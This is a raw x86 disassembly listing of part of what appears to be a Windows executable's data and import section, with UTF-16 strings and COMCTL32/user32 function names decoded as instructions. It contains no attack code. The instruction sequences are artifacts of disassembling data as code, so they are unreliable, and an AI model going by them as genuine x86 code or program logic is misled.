  428093:	jae    0x428095
  428095:	imul   eax,DWORD PTR [eax],0x47006e
  42809b:	imul   eax,DWORD PTR [eax],0x70006d
  4280a1:	bound  eax,QWORD PTR [eax]
  4280a3:	outs   dx,DWORD PTR ds:[esi]
  4280a4:	add    BYTE PTR [eax+0x0],dh
  4280a7:	imul   eax,DWORD PTR [eax],0x650000
  4280ad:	js     0x4280af
  4280af:	jae    0x4280b1
  4280b1:	outs   dx,DWORD PTR ds:[esi]
  4280b2:	add    BYTE PTR [ebx+0x0],dh
  4280b5:	popa   
  4280b6:	add    BYTE PTR [esi+0x0],ch
  4280b9:	je     0x4280bb
  4280bb:	add    BYTE PTR [eax],al
  4280bd:	bound  eax,QWORD PTR [eax]
  4280bf:	jns    0x4280c1
  4280c1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  4280c6:	add    BYTE PTR [eax+eax*1+0x74],ah
  4280ca:	add    BYTE PTR [ecx+0x0],ah
  4280cd:	add    BYTE PTR [eax],al
  4280cf:	js     0x4280d1
  4280d1:	imul   eax,DWORD PTR [eax],0x610054
  4280d7:	imul   eax,DWORD PTR [eax],0x48006e
  4280dd:	popa   
  4280de:	add    BYTE PTR [esi+0x0],ch
  4280e1:	add    BYTE PTR fs:[eax],al
  4280e4:	add    BYTE PTR [edi+0x0],cl
  4280e7:	ja     0x4280e9
  4280e9:	ins    BYTE PTR es:[edi],dx
  4280ea:	add    BYTE PTR [ebx+0x0],dh
  4280ed:	popa   
  4280ee:	add    BYTE PTR [ebx+0x0],dh
  4280f1:	jo     0x4280f3
  4280f3:	popa   
  4280f4:	add    BYTE PTR [ecx+0x0],ch
  4280f7:	imul   eax,DWORD PTR [eax],0x72
  4280fa:	add    BYTE PTR [ebp+0x0],ah
  4280fd:	jbe    0x4280ff
  4280ff:	add    BYTE PTR [eax],al
  428101:	jb     0x428103
  428103:	jne    0x428105
  428105:	je     0x428107
  428107:	ins    DWORD PTR es:[edi],dx
  428108:	add    BYTE PTR [ebp+0x0],dh
  42810b:	arpl   WORD PTR [eax],ax
  42810d:	jne    0x42810f
  42810f:	jo     0x428111
  428111:	add    BYTE PTR [eax],al
  428113:	jae    0x428115
  428115:	outs   dx,DWORD PTR ds:[esi]
  428116:	add    BYTE PTR [esi+0x0],ah
  428119:	imul   eax,DWORD PTR [eax],0x630062
  42811f:	outs   dx,DWORD PTR ds:[esi]
  428120:	add    BYTE PTR [ecx+0x0],ch
  428123:	jb     0x428125
  428125:	jae    0x428127
  428127:	outs   dx,DWORD PTR ds:[esi]
  428128:	add    BYTE PTR [eax],al
  42812a:	add    BYTE PTR [ebx+0x0],dl
  42812d:	outs   dx,DWORD PTR ds:[esi]
  42812e:	add    BYTE PTR [ebx+0x0],ah
  428131:	popa   
  428132:	add    BYTE PTR [ecx+0x0],ch
  428135:	jae    0x428137
  428137:	data16 add BYTE PTR [ecx+0x0],ah
  42813b:	jb     0x42813d
  42813d:	popa   
  42813e:	add    BYTE PTR [ecx+0x0],ch
  428141:	add    BYTE PTR [eax],al
  428143:	add    BYTE PTR [esi],cl
  428145:	adc    BYTE PTR [eax],al
  428147:	out    0x67,eax
  428149:	adc    BYTE PTR [eax],al
  42814b:	js     0x428174
  42814d:	adc    BYTE PTR [eax],al
  42814f:	test   al,0x13
  428151:	adc    BYTE PTR [eax],al
  428153:	fs push esi
  428155:	adc    BYTE PTR [eax],al
  428157:	jp     0x428179
  428159:	adc    BYTE PTR [eax],al
  42815b:	enter  0x1052,0x0
  42815f:	loop   0x4281d4
  428161:	adc    BYTE PTR [eax],al
  428163:	ja     0x4281d0
  428165:	adc    BYTE PTR [eax],al
  428167:	cmp    al,0x2b
  428169:	adc    BYTE PTR [eax],al
  42816b:	rcl    BYTE PTR [edx],1
  42816d:	adc    BYTE PTR [eax],al
  42816f:	sbb    DWORD PTR [eax+0x10],ebx
  428172:	add    BYTE PTR [esi],ah
  428174:	add    dl,BYTE PTR [eax]
  428176:	add    BYTE PTR [edi+0xc],dh
  428179:	adc    BYTE PTR [eax],al
  42817b:	mov    dh,BYTE PTR [ecx]
  42817d:	adc    BYTE PTR [eax],al
  42817f:	out    dx,al
  428180:	sbb    eax,0xed80010
  428185:	adc    BYTE PTR [eax],al
  428187:	add    eax,0x3300107f
  42818c:	jbe    0x42819e
  42818e:	add    BYTE PTR [ebx-0x7f],al
  428191:	inc    edx
  428192:	add    BYTE PTR [edi-0x7f],al
  428195:	inc    edx
  428196:	add    BYTE PTR [ebx-0x7f],cl
  428199:	inc    edx
  42819a:	add    BYTE PTR [edi-0x7f],cl
  42819d:	inc    edx
  42819e:	add    BYTE PTR [ebx-0x7f],dl
  4281a1:	inc    edx
  4281a2:	add    BYTE PTR [edi-0x7f],dl
  4281a5:	inc    edx
  4281a6:	add    BYTE PTR [ebx-0x7f],bl
  4281a9:	inc    edx
  4281aa:	add    BYTE PTR [edi-0x7f],bl
  4281ad:	inc    edx
  4281ae:	add    BYTE PTR [ebx-0x7f],ah
  4281b1:	inc    edx
  4281b2:	add    BYTE PTR [edi-0x7f],ah
  4281b5:	inc    edx
  4281b6:	add    BYTE PTR [ebx-0x7f],ch
  4281b9:	inc    edx
  4281ba:	add    BYTE PTR [edi-0x7f],ch
  4281bd:	inc    edx
  4281be:	add    BYTE PTR [ebx-0x7f],dh
  4281c1:	inc    edx
  4281c2:	add    BYTE PTR [edi-0x7f],dh
  4281c5:	inc    edx
  4281c6:	add    BYTE PTR [ebx-0x7f],bh
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [edi-0x7f],bh
  4281cd:	inc    edx
  4281ce:	add    BYTE PTR [ebx-0x78ffbd7f],al
  4281d4:	add    DWORD PTR [edx+0x0],0x42818b
  4281db:	sbb    eax,DWORD PTR [edx-0x7de0ffbe]
  4281e1:	inc    edx
  4281e2:	add    BYTE PTR [ebx],ah
  4281e4:	add    BYTE PTR [edx+0x0],0x27
  4281e8:	add    BYTE PTR [edx+0x0],0x2b
  4281ec:	add    BYTE PTR [edx+0x0],0x2f
  4281f0:	add    BYTE PTR [edx+0x0],0x33
  4281f4:	add    BYTE PTR [edx+0x0],0x37
  4281f8:	add    BYTE PTR [edx+0x0],0x3b
  4281fc:	add    BYTE PTR [edx+0x0],0x3f
  428200:	add    BYTE PTR [edx+0x0],0x43
  428204:	add    BYTE PTR [edx+0x0],0x47
  428208:	add    BYTE PTR [edx+0x0],0x4b
  42820c:	add    BYTE PTR [edx+0x0],0x4f
  428210:	add    BYTE PTR [edx+0x0],0x53
  428214:	add    BYTE PTR [edx+0x0],0x57
  428218:	add    BYTE PTR [edx+0x0],0x29
  42821c:	or     al,0x10
  42821e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428224:	push   edi
  428225:	adc    BYTE PTR [eax],al
  428227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428228:	outs   dx,DWORD PTR ds:[esi]
  428229:	adc    BYTE PTR [eax],al
  42822b:	push   ebx
  42822c:	popa   
  42822d:	adc    BYTE PTR [eax],al
  42822f:	add    dh,BYTE PTR [ebp+0x10]
  428232:	add    dh,cl
  428234:	jle    0x428246
  428236:	add    BYTE PTR [esi+edx*2],dl
  428239:	adc    BYTE PTR [eax],al
  42823b:	mov    al,0x68
  42823d:	adc    BYTE PTR [eax],al
  42823f:	aas    
  428240:	inc    esp
  428241:	adc    BYTE PTR [eax],al
  428243:	pop    ebp
  428244:	and    DWORD PTR [eax],edx
  428246:	add    bl,dl
  428248:	jl     0x42825a
  42824a:	add    BYTE PTR [edx+0xb],dh
  42824d:	adc    BYTE PTR [eax],al
  42824f:	inc    edx
  428250:	push   eax
  428251:	adc    BYTE PTR [eax],al
  428253:	mov    ebp,0xbb001074
  428258:	pop    ds
  428259:	adc    BYTE PTR [eax],al
  42825b:	sub    DWORD PTR [eax+0x10],eax
  42825e:	add    BYTE PTR [ecx],dh
  428260:	ja     0x428272
  428262:	add    bl,dl
  428264:	sbb    dl,BYTE PTR [eax]
  428266:	add    BYTE PTR [esi+0x1e],ch
  428269:	adc    BYTE PTR [eax],al
  42826b:	or     ch,BYTE PTR [esi]
  42826d:	adc    BYTE PTR [eax],al
  42826f:	sbb    eax,0xa100103e
  428274:	data16 adc BYTE PTR [eax],al
  428277:	xchg   ecx,eax
  428278:	bound  edx,QWORD PTR [eax]
  42827a:	add    BYTE PTR [esi],bh
  42827c:	dec    edi
  42827d:	adc    BYTE PTR [eax],al
  42827f:	in     eax,dx
  428280:	adc    BYTE PTR fs:[eax],al
  428283:	sub    bl,BYTE PTR [ecx+0x10]
  428286:	add    BYTE PTR [esi+0x43],al
  428289:	adc    BYTE PTR [eax],al
  42828b:	imul   edi,DWORD PTR [eax+edx*1],0x0
  42828f:	rol    BYTE PTR [esi+0x10],0x0
  428293:	in     eax,0x31
  428295:	adc    BYTE PTR [eax],al
  428297:	mov    esp,0x5b00104f
  42829c:	add    BYTE PTR [edx+0x0],0x5f
  4282a0:	add    BYTE PTR [edx+0x0],0x63
  4282a4:	add    BYTE PTR [edx+0x0],0x67
  4282a8:	add    BYTE PTR [edx+0x0],0x6b
  4282ac:	add    BYTE PTR [edx+0x0],0x6f
  4282b0:	add    BYTE PTR [edx+0x0],0x73
  4282b4:	add    BYTE PTR [edx+0x0],0x77
  4282b8:	add    BYTE PTR [edx+0x0],0x7b
  4282bc:	add    BYTE PTR [edx+0x0],0x7f
  4282c0:	add    BYTE PTR [edx+0x0],0x83
  4282c4:	add    BYTE PTR [edx+0x0],0x87
  4282c8:	add    BYTE PTR [edx+0x0],0x8b
  4282cc:	add    BYTE PTR [edx+0x0],0x8f
  4282d0:	add    BYTE PTR [edx+0x0],0x93
  4282d4:	add    BYTE PTR [edx+0x0],0x97
  4282d8:	add    BYTE PTR [edx+0x0],0xe1
  4282dc:	and    dl,BYTE PTR [eax]
  4282de:	add    bh,bh
  4282e0:	push   ecx
  4282e1:	adc    BYTE PTR [eax],al
  4282e3:	test   BYTE PTR ds:0x1d0c0010,0x10
  4282ea:	add    BYTE PTR [ebx],al
  4282ec:	sbb    dl,BYTE PTR [eax]
  4282ee:	add    ch,ah
  4282f0:	or     dl,BYTE PTR [eax]
  4282f2:	add    BYTE PTR [edi+0x42001035],bl
  4282f8:	pop    edi
  4282f9:	adc    BYTE PTR [eax],al
  4282fb:	adc    eax,0xd300103f
  428300:	cmp    dl,BYTE PTR [eax]
  428302:	add    BYTE PTR [ebp+0x1001021],ah
  428308:	sbb    al,0x10
  42830a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428310:	adc    BYTE PTR cs:[eax],al
  428313:	push   eax
  428314:	adc    BYTE PTR [bx+si],al
  428317:	mov    edi,0xdb00102d
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0xeb
  42832c:	add    BYTE PTR [edx+0x0],0xef
  428330:	add    BYTE PTR [edx+0x0],0xf3
  428334:	add    BYTE PTR [edx+0x0],0xf7
  428338:	add    BYTE PTR [edx+0x0],0xfb
  42833c:	add    BYTE PTR [edx+0x0],0xff
  428340:	add    BYTE PTR [edx+0x0],0x3
  428344:	add    DWORD PTR [edx+0x0],0x7
  428348:	add    DWORD PTR [edx+0x0],0xb
  42834c:	add    DWORD PTR [edx+0x0],0xf
  428350:	add    DWORD PTR [edx+0x0],0x13
  428354:	add    DWORD PTR [edx+0x0],0x17
  428358:	add    DWORD PTR [edx+0x0],0xffffff98
  42835c:	pusha  
  42835d:	adc    BYTE PTR [eax],al
  42835f:	pop    ebp
  428360:	js     0x428372
  428362:	add    BYTE PTR [esi],bh
  428364:	dec    eax
  428365:	adc    BYTE PTR [eax],al
  428367:	cmp    al,0x7a
  428369:	adc    BYTE PTR [eax],al
  42836b:	aam    0x9
  42836d:	adc    BYTE PTR [eax],al
  42836f:	or     cl,BYTE PTR [ebx]
  428371:	adc    BYTE PTR [eax],al
  428373:	pop    ebx
  428374:	push   ebp
  428375:	adc    BYTE PTR [eax],al
  428377:	mov    esi,0x6001032
  42837c:	xor    edx,DWORD PTR [eax]
  42837e:	add    BYTE PTR [esi-0x16ffefc0],al
  428384:	and    eax,0x61460010
  428389:	adc    BYTE PTR [eax],al
  42838b:	adc    DWORD PTR [ebp+0x10],ebp
  42838e:	add    al,al
  428390:	dec    esi
  428391:	adc    BYTE PTR [eax],al
  428393:	jae    0x4283b3
  428395:	adc    BYTE PTR [eax],al
  428397:	dec    ebx
  428398:	add    eax,0x835b0010
  42839d:	inc    edx
  42839e:	add    BYTE PTR [edi-0x7d],bl
  4283a1:	inc    edx
  4283a2:	add    BYTE PTR [ebx-0x7d],ah
  4283a5:	inc    edx
  4283a6:	add    BYTE PTR [edi-0x7d],ah
  4283a9:	inc    edx
  4283aa:	add    BYTE PTR [ebx-0x7d],ch
  4283ad:	inc    edx
  4283ae:	add    BYTE PTR [edi-0x7d],ch
  4283b1:	inc    edx
  4283b2:	add    BYTE PTR [ebx-0x7d],dh
  4283b5:	inc    edx
  4283b6:	add    BYTE PTR [edi-0x7d],dh
  4283b9:	inc    edx
  4283ba:	add    BYTE PTR [ebx-0x7d],bh
  4283bd:	inc    edx
  4283be:	add    BYTE PTR [edi-0x7d],bh
  4283c1:	inc    edx
  4283c2:	add    BYTE PTR [ebx-0x78ffbd7d],al
  4283c8:	add    DWORD PTR [edx+0x0],0xffffff8b
  4283cc:	add    DWORD PTR [edx+0x0],0xffffff8f
  4283d0:	add    DWORD PTR [edx+0x0],0xffffff93
  4283d4:	add    DWORD PTR [edx+0x0],0xffffff97
  4283d8:	add    DWORD PTR [edx+0x0],0x0
	...
  4283e4:	cmp    dh,BYTE PTR [ecx+0x52]
  4283e7:	dec    edi
  4283e8:	add    BYTE PTR [eax],al
  4283ea:	add    BYTE PTR [eax],al
  4283ec:	inc    eax
  4283ed:	lea    eax,[edx]
  4283ef:	add    BYTE PTR [ecx],al
  4283f1:	add    BYTE PTR [eax],al
  4283f3:	add    BYTE PTR [ecx],al
  4283f5:	add    BYTE PTR [eax],al
  4283f7:	add    BYTE PTR [ecx],al
  4283f9:	add    BYTE PTR [eax],al
  4283fb:	add    BYTE PTR [eax],dl
  4283fd:	lea    eax,[edx]
  4283ff:	add    BYTE PTR [eax],dh
  428401:	lea    eax,[edx]
  428403:	add    BYTE PTR [eax],ah
  428405:	lea    eax,[edx]
	...
  428413:	add    al,bl
  428415:	test   DWORD PTR [edx],eax
  428417:	add    ah,dh
  428419:	test   DWORD PTR [edx],eax
  42841b:	add    BYTE PTR [esi],al
  42841d:	xchg   BYTE PTR [edx],al
  42841f:	add    BYTE PTR [eax],bl
  428421:	xchg   BYTE PTR [edx],al
  428423:	add    BYTE PTR [eax],dh
  428425:	xchg   BYTE PTR [edx],al
  428427:	add    BYTE PTR [esi+eax*4+0x2],al
  42842b:	add    BYTE PTR [esi-0x7a],bl
  42842e:	add    al,BYTE PTR [eax]
  428430:	add    BYTE PTR [eax],al
  428432:	add    BYTE PTR [eax],al
  428434:	add    BYTE PTR [esi-0x7961fffe],0x2
  42843b:	add    BYTE PTR [esi+eax*4-0x7945fffe],ch
  428442:	add    al,BYTE PTR [eax]
  428444:	into   
  428445:	xchg   BYTE PTR [edx],al
  428447:	add    ah,bl
  428449:	xchg   BYTE PTR [edx],al
  42844b:	add    dh,ch
  42844d:	xchg   BYTE PTR [edx],al
  42844f:	add    BYTE PTR [eax],al
  428451:	xchg   DWORD PTR [edx],eax
  428453:	add    BYTE PTR [esi],cl
  428455:	xchg   DWORD PTR [edx],eax
  428457:	add    BYTE PTR [eax],ah
  428459:	xchg   DWORD PTR [edx],eax
  42845b:	add    BYTE PTR [edx],dh
  42845d:	xchg   DWORD PTR [edx],eax
  42845f:	add    BYTE PTR [eax-0x79],al
  428462:	add    al,BYTE PTR [eax]
  428464:	dec    esi
  428465:	xchg   DWORD PTR [edx],eax
  428467:	add    BYTE PTR [eax-0x79],ah
  42846a:	add    al,BYTE PTR [eax]
  42846c:	ins    BYTE PTR es:[edi],dx
  42846d:	xchg   DWORD PTR [edx],eax
  42846f:	add    BYTE PTR [edx-0x6bfffd79],al
  428475:	xchg   DWORD PTR [edx],eax
  428477:	add    BYTE PTR [esi-0x4dfffd79],ah
  42847d:	xchg   DWORD PTR [edx],eax
  42847f:	add    dl,al
  428481:	xchg   DWORD PTR [edx],eax
  428483:	add    dl,dl
  428485:	xchg   DWORD PTR [edx],eax
  428487:	add    al,ch
  428489:	xchg   DWORD PTR [edx],eax
  42848b:	add    ah,dh
  42848d:	xchg   DWORD PTR [edx],eax
  42848f:	add    BYTE PTR [esi],al
  428491:	mov    BYTE PTR [edx],al
  428493:	add    BYTE PTR [eax+ecx*4],bl
  428496:	add    al,BYTE PTR [eax]
  428498:	mov    BYTE PTR cs:[edx],al
  42849b:	add    BYTE PTR [eax+ecx*4],bh
  42849e:	add    al,BYTE PTR [eax]
  4284a0:	dec    esp
  4284a1:	mov    BYTE PTR [edx],al
  4284a3:	add    BYTE PTR [esi-0x78],bl
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	jb     0x428432
  4284aa:	add    al,BYTE PTR [eax]
  4284ac:	mov    BYTE PTR [eax-0x7765fffe],cl
  4284b2:	add    al,BYTE PTR [eax]
  4284b4:	lods   al,BYTE PTR ds:[esi]
  4284b5:	mov    BYTE PTR [edx],al
  4284b7:	add    BYTE PTR [eax+ecx*4-0x7733fffe],bh
  4284be:	add    al,BYTE PTR [eax]
  4284c0:	fmul   QWORD PTR [eax-0x7711fffe]
  4284c6:	add    al,BYTE PTR [eax]
  4284c8:	cld    
  4284c9:	mov    BYTE PTR [edx],al
  4284cb:	add    BYTE PTR [edx],cl
  4284cd:	mov    DWORD PTR [edx],eax
  4284cf:	add    BYTE PTR [edx],ah
  4284d1:	mov    DWORD PTR [edx],eax
  4284d3:	add    BYTE PTR [ecx+ecx*4],dh
  4284d6:	add    al,BYTE PTR [eax]
  4284d8:	inc    esi
  4284d9:	mov    DWORD PTR [edx],eax
  4284db:	add    BYTE PTR [edx-0x77],dl
  4284de:	add    al,BYTE PTR [eax]
  4284e0:	pop    esi
  4284e1:	mov    DWORD PTR [edx],eax
  4284e3:	add    BYTE PTR [edx-0x77],ch
  4284e6:	add    al,BYTE PTR [eax]
  4284e8:	jp     0x428473
  4284ea:	add    al,BYTE PTR [eax]
  4284ec:	nop
  4284ed:	mov    DWORD PTR [edx],eax
  4284ef:	add    BYTE PTR [esi-0x4ffffd77],bl
  4284f5:	mov    DWORD PTR [edx],eax
  4284f7:	add    dl,al
  4284f9:	mov    DWORD PTR [edx],eax
  4284fb:	add    BYTE PTR [eax],al
  4284fd:	add    BYTE PTR [eax],al
  4284ff:	add    ah,bl
  428501:	mov    DWORD PTR [edx],eax
  428503:	add    BYTE PTR [eax],al
  428505:	add    BYTE PTR [eax],al
  428507:	add    dl,bh
  428509:	mov    DWORD PTR [edx],eax
  42850b:	add    BYTE PTR [edx+ecx*4],cl
  42850e:	add    al,BYTE PTR [eax]
  428510:	push   ds
  428511:	mov    al,BYTE PTR [edx]
  428513:	add    BYTE PTR [edx+ecx*4],dh
  428516:	add    al,BYTE PTR [eax]
  428518:	inc    esi
  428519:	mov    al,BYTE PTR [edx]
  42851b:	add    BYTE PTR [eax-0x76],bl
  42851e:	add    al,BYTE PTR [eax]
  428520:	push   0x8600028a
  428525:	mov    al,BYTE PTR [edx]
  428527:	add    BYTE PTR [esi-0x5bfffd76],dl
  42852d:	mov    al,BYTE PTR [edx]
  42852f:	add    BYTE PTR [edx+ecx*4-0x753dfffe],dh
  428536:	add    al,BYTE PTR [eax]
  428538:	ror    BYTE PTR [edx-0x7521fffe],cl
  42853e:	add    al,BYTE PTR [eax]
  428540:	lock mov al,BYTE PTR [edx]
  428543:	add    BYTE PTR [edx],al
  428545:	mov    eax,DWORD PTR [edx]
  428547:	add    BYTE PTR [eax],bl
  428549:	mov    eax,DWORD PTR [edx]
  42854b:	add    BYTE PTR [esi],ah
  42854d:	mov    eax,DWORD PTR [edx]
  42854f:	add    BYTE PTR [edx],dh
  428551:	mov    eax,DWORD PTR [edx]
  428553:	add    BYTE PTR [ebx+ecx*4+0x2],cl
  428557:	add    BYTE PTR [ebx+ecx*4+0x2],ah
  42855b:	add    BYTE PTR [ebx+ecx*4+0x2],bh
  42855f:	add    BYTE PTR [edx-0x69fffd75],cl
  428565:	mov    eax,DWORD PTR [edx]
  428567:	add    BYTE PTR [eax+0x28b],ch
  42856d:	add    BYTE PTR [eax],al
  42856f:	add    al,cl
  428571:	mov    eax,DWORD PTR [edx]
  428573:	add    dl,dl
  428575:	mov    eax,DWORD PTR [edx]
  428577:	add    al,ah
  428579:	mov    eax,DWORD PTR [edx]
  42857b:	add    ah,ch
  42857d:	mov    eax,DWORD PTR [edx]
  42857f:	add    ah,bh
  428581:	mov    eax,DWORD PTR [edx]
  428583:	add    BYTE PTR [edx],cl
  428585:	mov    WORD PTR [edx],es
  428587:	add    BYTE PTR [esi],dl
  428589:	mov    WORD PTR [edx],es
  42858b:	add    BYTE PTR [eax],ah
  42858d:	mov    WORD PTR [edx],es
  42858f:	add    BYTE PTR [edx],dh
  428591:	mov    WORD PTR [edx],es
  428593:	add    BYTE PTR [eax-0x74],cl
  428596:	add    al,BYTE PTR [eax]
  428598:	pop    esi
  428599:	mov    WORD PTR [edx],es
  42859b:	add    BYTE PTR [esp+ecx*4+0x2],dh
  42859f:	add    BYTE PTR [esp+ecx*4-0x736bfffe],al
  4285a6:	add    al,BYTE PTR [eax]
  4285a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4285a9:	mov    WORD PTR [edx],es
  4285ab:	add    BYTE PTR [edx-0x35fffd74],dh
  4285b1:	mov    WORD PTR [edx],es
  4285b3:	add    ah,dl
  4285b5:	mov    WORD PTR [edx],es
  4285b7:	add    al,ah
  4285b9:	mov    WORD PTR [edx],es
  4285bb:	add    dh,ch
  4285bd:	mov    WORD PTR [edx],es
	...
  4285cf:	add    BYTE PTR [ebx+0x6d],ah
  4285d2:	fs cs gs js 0x42863c
  4285d7:	add    BYTE PTR [edi],dl
  4285d9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285dd:	je     0x428651
  4285df:	outs   dx,DWORD PTR ds:[esi]
  4285e0:	jns    0x428632
  4285e2:	jb     0x428653
  4285e4:	jo     0x42864b
  4285e6:	jb     0x42865c
  4285e8:	jns    0x42863d
  4285ea:	push   0x50746565
  4285ef:	popa   
  4285f0:	add    BYTE PTR gs:[bx+si],al
  4285f4:	pop    esp
  4285f5:	add    BYTE PTR [eax+0x72],dl
  4285f8:	outs   dx,DWORD PTR ds:[esi]
  4285f9:	jo     0x428660
  4285fb:	jb     0x428671
  4285fd:	jns    0x428652
  4285ff:	push   0x57746565
  428604:	add    BYTE PTR [eax],al
  428606:	pop    ebx
  428607:	add    BYTE PTR [eax+0x72],dl
  42860a:	outs   dx,DWORD PTR ds:[esi]
  42860b:	jo     0x428672
  42860d:	jb     0x428683
  42860f:	jns    0x428664
  428611:	push   0x41746565
  428616:	add    BYTE PTR [eax],al
  428618:	dec    esi
  428619:	add    BYTE PTR [ecx+0x6d],cl
  42861c:	popa   
  42861d:	addr16 gs dec esp
  428620:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428627:	ins    BYTE PTR es:[edi],dx
  428628:	popa   
  428629:	arpl   WORD PTR [ebp+0x49],sp
  42862c:	arpl   WORD PTR [edi+0x6e],bp
  42862f:	add    BYTE PTR [ecx],dh
  428631:	add    BYTE PTR [ecx+0x6d],cl
  428634:	popa   
  428635:	addr16 gs dec esp
  428638:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42863f:	je     0x4286b3
  428641:	outs   dx,DWORD PTR ds:[esi]
  428642:	jns    0x428644
  428644:	inc    eax
  428645:	add    BYTE PTR [ecx+0x6d],cl
  428648:	popa   
  428649:	addr16 gs dec esp
  42864c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428653:	dec    ecx
  428654:	ins    DWORD PTR es:[edi],dx
  428655:	popa   
  428656:	addr16 gs inc ebx
  428659:	outs   dx,DWORD PTR ds:[esi]
  42865a:	jne    0x4286ca
  42865c:	je     0x42865e
  42865e:	dec    esp
  42865f:	add    BYTE PTR [ecx+0x6d],cl
  428662:	popa   
  428663:	addr16 gs dec esp
  428666:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42866d:	outs   dx,DWORD PTR ds:[esi]
  42866e:	jbe    0x4286d5
  428670:	add    BYTE PTR [eax],al
  428672:	inc    ebx
  428673:	dec    edi
  428674:	dec    ebp
  428675:	inc    ebx
  428676:	push   esp
  428677:	dec    esp
  428678:	xor    esi,DWORD PTR [edx]
  42867a:	cs fs ins BYTE PTR es:[edi],dx
  42867d:	ins    BYTE PTR es:[edi],dx
  42867e:	add    BYTE PTR [eax],al
  428680:	push   edi
  428681:	add    BYTE PTR [ebx+0x72],al
  428684:	gs popa 
  428686:	je     0x4286ed
  428688:	inc    esp
  428689:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  428690:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428698:	jb     0x4286fb
  42869a:	ins    DWORD PTR es:[edi],dx
  42869b:	push   edi
  42869c:	add    BYTE PTR [eax],al
  42869e:	xor    al,BYTE PTR [edx]
  4286a0:	push   ebx
  4286a1:	gs je  0x4286e7
  4286a4:	popa   
  4286a5:	jb     0x42870c
  4286a7:	je     0x4286f9
  4286a9:	outs   dx,DWORD PTR ds:[esi]
  4286aa:	jae    0x4286ac
  4286ac:	cmp    al,BYTE PTR [ecx]
  4286ae:	inc    edi
  4286af:	gs je  0x4286ff
  4286b2:	gs jae 0x428728
  4286b5:	popa   
  4286b6:	addr16 gs inc ecx
  4286b9:	add    BYTE PTR [edx+0x61724400],dh
  4286bf:	ja     0x428707
  4286c1:	jb     0x428724
  4286c3:	ins    DWORD PTR es:[edi],dx
  4286c4:	gs inc ebx
  4286c6:	outs   dx,DWORD PTR ds:[esi]
  4286c7:	outs   dx,BYTE PTR ds:[esi]
  4286c8:	je     0x42873c
  4286ca:	outs   dx,DWORD PTR ds:[esi]
  4286cb:	ins    BYTE PTR es:[edi],dx
  4286cc:	add    BYTE PTR [eax],al
  4286ce:	sbb    BYTE PTR [ecx],al
  4286d0:	inc    edi
  4286d1:	gs je  0x42871d
  4286d4:	arpl   WORD PTR [edi+0x6e],bp
  4286d7:	dec    ecx
  4286d8:	outs   dx,BYTE PTR ds:[esi]
  4286d9:	outs   dx,WORD PTR ds:[esi]
  4286db:	add    bl,bh
  4286dd:	add    dl,BYTE PTR [edx+esi*2+0x61]
  4286e1:	arpl   WORD PTR [ebx+0x50],bp
  4286e4:	outs   dx,DWORD PTR ds:[esi]
  4286e5:	jo     0x42875c
  4286e7:	jo     0x428736
  4286e9:	outs   dx,BYTE PTR gs:[esi]
  4286eb:	jne    0x4286ed
  4286ed:	add    cl,bl
  4286ef:	add    DWORD PTR [ebp+0x6f],ecx
  4286f2:	outs   dx,BYTE PTR ds:[esi]
  4286f3:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4286fb:	push   edx
  4286fc:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428701:	add    BYTE PTR [ebx+0x68],al
  428704:	popa   
  428705:	jb     0x42875c
  428707:	jo     0x428779
  428709:	gs jb  0x428763
  42870c:	add    BYTE PTR [eax],al
  42870e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428712:	je     0x428758
  428714:	ins    BYTE PTR es:[edi],dx
  428715:	addr16 dec ecx
  428717:	je     0x42877e
  428719:	ins    DWORD PTR es:[edi],dx
  42871a:	push   esp
  42871b:	gs js  0x428792
  42871e:	inc    ecx
  42871f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428723:	push   0x774f776f
  428728:	outs   dx,BYTE PTR ds:[esi]
  428729:	gs fs push eax
  42872c:	outs   dx,DWORD PTR ds:[esi]
  42872d:	jo     0x4287a4
  42872f:	jo     0x4287a4
  428731:	add    BYTE PTR [eax],bl
  428733:	add    dl,BYTE PTR [edx+0x65]
  428736:	ins    DWORD PTR es:[edi],dx
  428737:	outs   dx,DWORD PTR ds:[esi]
  428738:	jbe    0x42879f
  42873a:	push   eax
  42873b:	jb     0x4287ac
  42873d:	jo     0x428796
  42873f:	add    BYTE PTR [edi+0x2],bh
  428742:	push   ebx
  428743:	push   0x6957776f
  428748:	outs   dx,BYTE PTR ds:[esi]
  428749:	outs   dx,DWORD PTR fs:[esi]
  42874b:	ja     0x42874d
  42874d:	add    BYTE PTR [ebx],bl
  42874f:	add    BYTE PTR [ebx+0x61],al
  428752:	ins    BYTE PTR es:[edi],dx
  428753:	ins    BYTE PTR es:[edi],dx
  428754:	push   edi
  428755:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42875c:	outs   dx,DWORD PTR ds:[esi]
  42875d:	arpl   WORD PTR [edi+0x0],dx
  428760:	mov    dh,0x1
  428762:	dec    esp
  428763:	outs   dx,DWORD PTR ds:[esi]
  428764:	popa   
  428765:	fs dec ebp
  428767:	outs   dx,BYTE PTR gs:[esi]
  428769:	jne    0x4287ac
  42876b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428772:	arpl   WORD PTR [eax+0x54],bp
  428775:	outs   dx,DWORD PTR ds:[esi]
  428776:	push   esp
  428777:	push   0x69577369
  42877c:	outs   dx,BYTE PTR ds:[esi]
  42877d:	outs   dx,DWORD PTR fs:[esi]
  42877f:	ja     0x428781
  428781:	add    BYTE PTR [eax],ah
  428783:	add    dl,BYTE PTR [ebx+0x63]
  428786:	jb     0x4287f7
